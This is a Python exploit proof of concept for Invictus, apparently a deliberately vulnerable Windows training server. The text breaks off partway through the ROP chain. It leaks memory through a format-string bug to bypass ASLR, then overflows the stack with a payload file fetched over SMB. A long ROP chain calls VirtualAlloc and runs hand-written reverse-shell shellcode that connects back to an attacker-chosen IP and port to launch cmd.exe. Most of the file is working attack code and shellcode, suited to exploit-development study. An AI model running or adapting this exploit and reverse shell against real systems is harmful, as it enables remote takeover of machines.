#!/usr/bin/python3

# Title: Invictus POC bypassing ASLR and ROP without external library
# Date: 05-09-2024
# POC Author: Hodorsec
# Program Homepage: https://github.com/patrickhener/invictus
# Program Vulnerability Description: https://github.com/patrickhener/invictus/blob/main/solution/exploit.py
# Tested on: Windows 10 (19045.4780) and Windows 11 (22631.3737)
# Caveats: uses SMB for payload retrieval; for Win 11 requiring "EnableInsecureGuestLogons" and "AllowInsecureGuestAuth"
# ROP comment: managed to execute VirtualAlloc eventually by using below odd ROP instruction and compensation unwanted opcodes
# intbasemain + 0x6868,                   # xchg eax, esp ; sbb eax, 0x18890000 ; add esp, 0x18 ; add eax, 0x04 ; pop ebx ; ret ;

# Summary:
# POC for leaking memory and controlling EIP stackbuffer. Does not use any external Windows library, as shown in initial solution provided above.
# Exploits the formatting string buffer in "Write File" opcode, leaks memory addresses when read using "Read File" opcode. 
# For EIP control, an overly large file is read directly from a SMB share.

# Example results running POC:
# $ python3 poc_invictus_v0.1.py -t 192.168.252.9 -p 1337 -w 11 -i 192.168.252.7 -s files -ri 192.168.252.7 -rp 6969
# In order to run, setup an SMB server locally.
# E.g.; run Impacket by using: '$ sudo impacket-smbserver files /tmp -smb2support'
# 
# [*] PRESS ENTER TO CONNECT AND SEND PAYLOAD
#
# [*] LEAKING ADDRESSES...
# 
# [*] Attempting to delete program log file C:\windows\temp\invictus_log.txt ...
# [*] Attempting to write file using formatting codes c:\users\public\testfile.txt ...
# [*] Attempting to read program log C:\windows\temp\invictus_log.txt ...
# ['0x804 OK =====\r\n2024-09-05 21:55:55 - Written file c:\\users\\public\\testfile.txt ', ' AAAA:76f480a5:005eb107:3d3d3d3d:30320a3d:302d3432:35302d39:3a313220:353a3535:202d2035:74697257:206e6574:656c6966:5c3a6320:72657375:75705c73:63696c62:7365745c:6c696674:78742e65:69772074:63206874:65746e6f:4120746e:3a414141:78383025:3830253a:30253a78:253a7838:3a783830:78383025:3830253a:30253a78:253a7838:3a783830:78383025:3830253a:30253a78:253a7838:3a783830:78383025:3830253a:30253a78:253a7838:3a783830:78383025:3830253a:30253a78:253a7838:3a783830:78383025:%\r\n=====\r\n']
# [i] Baseaddress of main binary is 0x5e0000
# 
# [*] CREATING AND OBTAINING CRASH PAYLOAD...
# 
# [*] Attempting to read file \\192.168.252.7\files\crashfile.txt ...
#

# Function flow:
# 1. Delete any current logfile
# 2. Write a local file using many %n chars
# 3. Read from the default program logfile
# 4. Extract base address of main program from memory leak response
# 5. Create overly large file containing payload
# 6. Obtain payload file via SMB
# 7. Obtain EIP control and execute code

import sys
from struct import pack
import argparse
import socket
import os
import traceback
import ipaddress

# Set timeout
timeout = 3

# Global vars
host = None
port = None
gsock = None

# Badchars
badchars = [ ]  

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

class Helpers:      
    def scAlignASM(offsetsc):
        # Could be improved. Also, only supports ADD currently
        maxaddbyte = 0x7f
        stripnull = True                                                                # Strip off NULL's
        
        # Byte values of ASM's
        maxaddax = b"\x66\x83\xc0\x7f"                                                  # ADD AX, 0x7f  ; Maximum value to add for AX size
        prefixaddax = b"\x66\x83"                                                       # ADD AX, VALUE ; Add value to AX defined by VALUE
        prefixaddal = b"\x04"                                                           # ADD AL, VALUE ; Add small value without causing NULL's
        
        # Calculate values
        amountmaxaddax = int(offsetsc / maxaddbyte)                                     # Calculate how many max values fit in
        remainaddal = offsetsc - (amountmaxaddax * maxaddbyte)                          # Calculate remaining value to add in AL
        bufmaxaddax = maxaddax * amountmaxaddax                                         # Create buffer of amount of ADD AX, 0x7f instructions                   
        suffixaddal = Helpers.toByteHex(hex(remainaddal),stripnull)[::-1]               # Convert remaining value to bytes
        
        # Align buffer
        alignsc = b""
        alignsc += b"\x54"                                                              # PUSH ESP
        alignsc += b"\x58"                                                              # POP EAX
        alignsc += bufmaxaddax
        if remainaddal > 0x0:
            alignsc += prefixaddal + suffixaddal
        alignsc += b"\x50"                                                              # PUSH EAX
        alignsc += b"\x5c"                                                              # POP ESP

        return alignsc
    
    def toByteHex(hexaddr,stripnull = False):
        """
        DESCR: Converts a hexaddress in stringformat to bytes
        IN: String hex address; 0x12345678
        OUT: Byte address
        """
        lenAddr = 8
        toByteHex = bytes.fromhex(hexaddr.lstrip('0x').rjust(lenAddr, '0'))
        if stripnull:
            toByteHex = toByteHex.lstrip(b"\x00")
        return toByteHex

    def toIntByte(byteaddr, endianness = 'big', strip = 'end'):
        """
        DESCR: Converts a byte hexaddr to int
        IN: byte hex address
        OUT: int address
        """
        if strip == 'end':
            value = hex(byteaddr)[-8:]
        elif strip == 'start':
            value = hex(byteaddr)[:9]
        else:
            return False
        
        toIntByte = int.from_bytes(Helpers.toByteHex(value),endianness)
        return toIntByte

    def convertPrettyHex(sh):
        """
        DESCR: Prefix each shellcode char with \\x
        IN: Shellcode
        OUT: \\x prefixed shellcode
        """
        hexencoded = "".join(map('\\x{:02x}'.format, sh))
        return hexencoded

    def negate(val, nbits=32):
        return (val + (1 << nbits)) % (1 << nbits)

    def addhex(offset, nbits = 32):
        largeVal = 0x88888888
        val = offset - largeVal
        return (val + (1 << nbits)) % (1 << nbits)

    def keyboard_interrupt():
        """Handles keyboardinterrupt exceptions"""""
        print("\n\n[*] User requested an interrupt, exiting...")
        exit(0)
    
class Shellcode:
    def asmrevshellShellcode(revip,revport):
        # Custom revshell, hacky port and ip vars
        # Generated using https://raw.githubusercontent.com/hodor-sec/Shellcoding/master/generic/asm_assemble_disassemble.py
        if revip == None or revport == None:
            print("[!] Empty IP address or port entered for payload, exiting...")
            sys.exit(0)
        ip = int(ipaddress.IPv4Address(revip)).to_bytes(4, byteorder='big')
        intlenport = len(str(revport))
        port = revport.to_bytes(int(intlenport/2), byteorder='big')
        
        asmip = b"\x68" + ip                            # push 0x                    # IP 
        if intlenport == 2:
            asmport = b"\xb0" + port                    # mov  al, 0x                # PORT
        else:
            asmport = b"\x66\xb8" + port                # mov  ax, 0x                # PORT
        
        shellcode = (
                b"\x89\xe5"                        # 0x0         mov  ebp, esp
                b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
                b"\x31\xc9"                        # 0x8         xor  ecx, ecx
                b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
                b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
                b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
                b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
                b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
                b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
                b"\x75\xf2"                        # 0x32        jne  0x14
                b"\xeb\x06"                        # 0x34        jmp  0x2a
                b"\x5e"                            # 0x36        pop  esi
                b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
                b"\xeb\x54"                        # 0x40        jmp  0x7e
                b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
                b"\x60"                            # 0x47        pushal
                b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
                b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
                b"\x01\xdf"                        # 0x55        add  edi, ebx
                b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
                b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
                b"\x01\xd8"                        # 0x63        add  eax, ebx
                b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
                b"\xe3\x36"                        # 0x68        jecxz0x7c
                b"\x49"                            # 0x70        dec  ecx
                b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
                b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
                b"\x01\xde"                        # 0x77        add  esi, ebx
                b"\x31\xc0"                        # 0x79        xor  eax, eax
                b"\x99"                            # 0x81        cdq
                b"\xfc"                            # 0x82        cld
                b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
                b"\x84\xc0"                        # 0x84        test al, al
                b"\x74\x07"                        # 0x86        je   0x5f
                b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
                b"\x01\xc2"                        # 0x91        add  edx, eax
                b"\xeb\xf4"                        # 0x93        jmp  0x53
                b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
                b"\x75\xdf"                        # 0x99        jne  0x44
                b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
                b"\x01\xda"                        # 0x104       add  edx, ebx
                b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
                b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
                b"\x01\xda"                        # 0x113       add  edx, ebx
                b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
                b"\x01\xd8"                        # 0x118       add  eax, ebx
                b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
                b"\x61"                            # 0x124       popal
                b"\xc3"                            # 0x125       ret
                b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
                b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
                b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
                b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
                b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
                b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
                b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
                b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
                b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
                b"\x31\xc0"                        # 0x159       xor  eax, eax
                b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
                b"\x50"                            # 0x165       push eax
                b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
                b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
                b"\x54"                            # 0x176       push esp
                b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
                b"\x89\xc3"                        # 0x180       mov  ebx, eax
                b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
                b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
                b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
                b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
                b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
                b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
                b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
                b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
                b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
                b"\x31\xdb"                        # 0x215       xor  ebx, ebx
                b"\x66\xbb\x90\x01"                # 0x217       mov  bx, 0x190
                b"\x29\xdc"                        # 0x221       sub  esp, ebx
                b"\x54"                            # 0x223       push esp
                b"\x83\xc3\x72"                    # 0x224       add  ebx, 0x72
                b"\x53"                            # 0x227       push ebx
                b"\xff\x55\x1c"                    # 0x228       call dword ptr [ebp + 0x1c]
                b"\x31\xc0"                        # 0x231       xor  eax, eax
                b"\x50"                            # 0x233       push eax
                b"\x50"                            # 0x234       push eax
                b"\x50"                            # 0x235       push eax
                b"\xb0\x06"                        # 0x236       mov  al, 6
                b"\x50"                            # 0x238       push eax
                b"\x2c\x05"                        # 0x239       sub  al, 5
                b"\x50"                            # 0x241       push eax
                b"\x40"                            # 0x242       inc  eax
                b"\x50"                            # 0x243       push eax
                b"\xff\x55\x20"                    # 0x244       call dword ptr [ebp + 0x20]
                b"\x89\xc6"                        # 0x247       mov  esi, eax
                b"\x31\xc0"                        # 0x249       xor  eax, eax
                b"\x50"                            # 0x251       push eax
                b"\x50"                            # 0x252       push eax
                b"" + asmip + b""
                b"" + asmport + b""
                b"\xc1\xe0\x10"                    # 0x262       shl  eax, 0x10
                b"\x66\x83\xc0\x02"                # 0x265       add  ax, 2
                b"\x50"                            # 0x269       push eax
                b"\x54"                            # 0x270       push esp
                b"\x5f"                            # 0x271       pop  edi
                b"\x31\xc0"                        # 0x272       xor  eax, eax
                b"\x50"                            # 0x274       push eax
                b"\x50"                            # 0x275       push eax
                b"\x50"                            # 0x276       push eax
                b"\x50"                            # 0x277       push eax
                b"\x04\x10"                        # 0x278       add  al, 0x10
                b"\x50"                            # 0x280       push eax
                b"\x57"                            # 0x281       push edi
                b"\x56"                            # 0x282       push esi
                b"\xff\x55\x24"                    # 0x283       call dword ptr [ebp + 0x24]
                b"\x56"                            # 0x286       push esi
                b"\x56"                            # 0x287       push esi
                b"\x56"                            # 0x288       push esi
                b"\x31\xc0"                        # 0x289       xor  eax, eax
                b"\x50"                            # 0x291       push eax
                b"\x50"                            # 0x292       push eax
                b"\xb8\xfe\xfe\xff\xff"            # 0x293       mov  eax, 0xfffffefe
                b"\xf7\xd8"                        # 0x298       neg  eax
                b"\x50"                            # 0x300       push eax
                b"\x31\xc0"                        # 0x301       xor  eax, eax
                b"\x50"                            # 0x303       push eax
                b"\x50"                            # 0x304       push eax
                b"\x50"                            # 0x305       push eax
                b"\x50"                            # 0x306       push eax
                b"\x50"                            # 0x307       push eax
                b"\x50"                            # 0x308       push eax
                b"\x50"                            # 0x309       push eax
                b"\x50"                            # 0x310       push eax
                b"\x50"                            # 0x311       push eax
                b"\x50"                            # 0x312       push eax
                b"\xb0\x44"                        # 0x313       mov  al, 0x44
                b"\x50"                            # 0x315       push eax
                b"\x54"                            # 0x316       push esp
                b"\x5f"                            # 0x317       pop  edi
                b"\xb8\x9b\x87\x9a\xff"            # 0x318       mov  eax, 0xff9a879b
                b"\xf7\xd8"                        # 0x323       neg  eax
                b"\x50"                            # 0x325       push eax
                b"\x68\x63\x6d\x64\x2e"            # 0x326       push 0x2e646d63
                b"\x54"                            # 0x331       push esp
                b"\x5b"                            # 0x332       pop  ebx
                b"\x89\xe0"                        # 0x333       mov  eax, esp
                b"\x31\xc9"                        # 0x335       xor  ecx, ecx
                b"\x66\x81\xc1\x90\x03"            # 0x337       add  cx, 0x390
                b"\x29\xc8"                        # 0x342       sub  eax, ecx
                b"\x50"                            # 0x344       push eax
                b"\x57"                            # 0x345       push edi
                b"\x31\xc0"                        # 0x346       xor  eax, eax
                b"\x50"                            # 0x348       push eax
                b"\x50"                            # 0x349       push eax
                b"\x50"                            # 0x350       push eax
                b"\x40"                            # 0x351       inc  eax
                b"\x50"                            # 0x352       push eax
                b"\x48"                            # 0x353       dec  eax
                b"\x50"                            # 0x354       push eax
                b"\x50"                            # 0x355       push eax
                b"\x53"                            # 0x356       push ebx
                b"\x50"                            # 0x357       push eax
                b"\xff\x55\x18"                    # 0x358       call dword ptr [ebp + 0x18]
                b"\x31\xc9"                        # 0x361       xor  ecx, ecx
                b"\x51"                            # 0x363       push ecx
                b"\x6a\xff"                        # 0x364       push -1
                b"\xff\x55\x10"                    # 0x366       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def msfcalcShellcode():
        # msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -v sc -e shellcode
        # Payload size: 193 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
        shellcode += b"\x63\x2e\x65\x78\x65\x00"
        return shellcode

class ROP:
    def vaSkeleton():
        rop_skel_gadgets = [
            0x41414141,                             # VirtualAlloc address 
            0x42424242,                             # Shellcode ret address
            0x43434343,                             # lpAddress; shellcode address, same as above
            0x44444444,                             # dwSize; size of shellcode == 0x1
            0x45454545,                             # flAllocationType == 0x1000
            0x46464646,                             # flProtect == 0x40
        ]
        return rop_skel_gadgets

    def chainVirtualAlloc(intbasemain,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskelAlign):
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in EDX
            intbasemain + 0x31f5,                   # push esp ; xor eax, eax ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x8d85,                   # mov eax, ebx ; pop ebx ; pop esi ; ret ;
            intbasemain + offsetk32va,
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Use value to calculate offset
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            ropskelfuncOffset & 0xffffffff, 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x84df,                   # add edx, eax; mov eax, edx; ret;
            # Save ESP on static address on stack, as it gets clobbered later on
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            
            ### Dereference PTR for VirtualAlloc address ###
            # Save in EDX
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            intbasemain + offsetk32va,
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x9a85,                   # mov eax,  [eax] ; ret ;     
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Restore previous ESP from stack in EAX
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;          
            
            ### Shellcode ret address ###
            # Move to next ROP skel argument
            intbasemain + 0x6871,                   # add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            # Save on stack
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Use value to calculate offset
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            ropskelscOffset, 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x84df,                   # add edx, eax; mov eax, edx; ret;
            # Move stack value back in EAX
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;    
                              
            ### lpAddress; same as above ###
            # Move to next ROP skel argument
            intbasemain + 0x6871,                   # add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            # Save ESP on stack
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret; 
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;         
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;  
                                               
            ### dwSize == 0x1 ###
            # Move to next ROP skel argument
            intbasemain + 0x6871,                   # add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            # Save ESP on stack
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret; 
            # Use value to calculate offset
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            0x1,
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Move stack value back in EAX
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;  
                        
            ### flAllocationType == 0x1000 ###
            # Move to next ROP skel argument
            intbasemain + 0x6871,                   # add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            # Save on stack
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Use value to calculate offset
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            0x1000,
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Move stack value back in EAX
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;          
                       
            ### flProtect == 0x40 ###
            # Move to next ROP skel argument
            intbasemain + 0x6871,                   # add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            # Save on stack
            intbasemain + 0x9394,                   # xchg dword ptr [0x40ea80], eax; ret;
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Use value to calculate offset
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            0x40,
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Move stack value back in EAX
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret;
            # Move value in referenced memory for ROP skeleton
            intbasemain + 0x96af,                   # mov  [eax], edx ; xor eax, eax ; add esp, 0x34 ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ;  
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x4877,                   # ret ; 
            # Restore ESP in EAX from static address on stack
            intbasemain + 0x9380,                   # mov eax, dword ptr [0x40ea80]; ret; 
            
            ### Align ESP with ROP ###
            # Save current ESP in EDX
            intbasemain + 0x31f5,                   # push esp ; xor eax, eax ; pop ebx ; pop esi ; ret ;
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x8d85,                   # mov eax, ebx ; pop ebx ; pop esi ; ret ;
